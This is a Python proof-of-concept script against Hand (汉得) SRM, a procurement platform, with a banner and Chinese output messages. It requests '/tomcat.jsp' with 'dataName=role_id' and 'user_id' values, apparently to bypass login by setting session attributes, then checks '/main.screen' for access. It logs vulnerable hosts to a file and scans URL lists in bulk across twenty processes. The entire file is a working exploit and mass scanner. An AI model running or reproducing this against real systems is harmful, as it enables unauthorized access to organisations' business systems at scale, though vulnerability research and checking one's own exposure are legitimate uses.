import requests, argparse, time, sys

requests.packages.urllib3.disable_warnings()
from multiprocessing import Pool


def banner():
    test = """
     __ __   ____  ____   ___      ___  _____ ____   ___ ___ 
    |  |  | /    ||    \ |   \    /  _]/ ___/|    \ |   |   |
    |  |  ||  o  ||  _  ||    \  /  [_(   \_ |  D  )| _   _ |
    |  _  ||     ||  |  ||  D  ||    _]\__  ||    / |  \_/  |
    |  |  ||  _  ||  |  ||     ||   [_ /  \ ||    \ |   |   |
    |  |  ||  |  ||  |  ||     ||     |\    ||  .  \|   |   |
    |__|__||__|__||__|__||_____||_____| \___||__|\_||___|___|                                                 
    """
    print(test)


def poc(target):
    payload1 = "/tomcat.jsp?dataName=role_id&dataValue=1"
    payload2 = "/tomcat.jsp?dataName=user_id&dataValue=1"
    payload3 = "/main.screen"
    try:
        res1 = requests.get(target + payload1, verify=False, timeout=10)
        if "ID" in res1.text:
            res2 = requests.get(target + payload2, verify=False, timeout=10)
            if "ID" in res2.text:
                res3 = requests.get(target + payload3, verify=False, timeout=10)
                if res3.status_code == 200:
                    print(f"[+]{target}存在漏洞")
                    with open("汉得result.txt", 'a', encoding='utf-8') as f:
                        f.write(f"{target}存在漏洞\n")
                else:
                    print(f"[-]{target}不存在漏洞")
            else:
                print(f"[-]{target}不存在漏洞")

        else:
            print(f"[-]{target}不存在漏洞")
    except Exception as e:
        print(f"该{target}可能存在问题")


def main():
    banner()
    parser = argparse.ArgumentParser(description="汉得SRM")
    parser.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")
    parser.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(20)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\tpython3 {sys.argv[0]} -h or --help")


if __name__ == '__main__':
    main()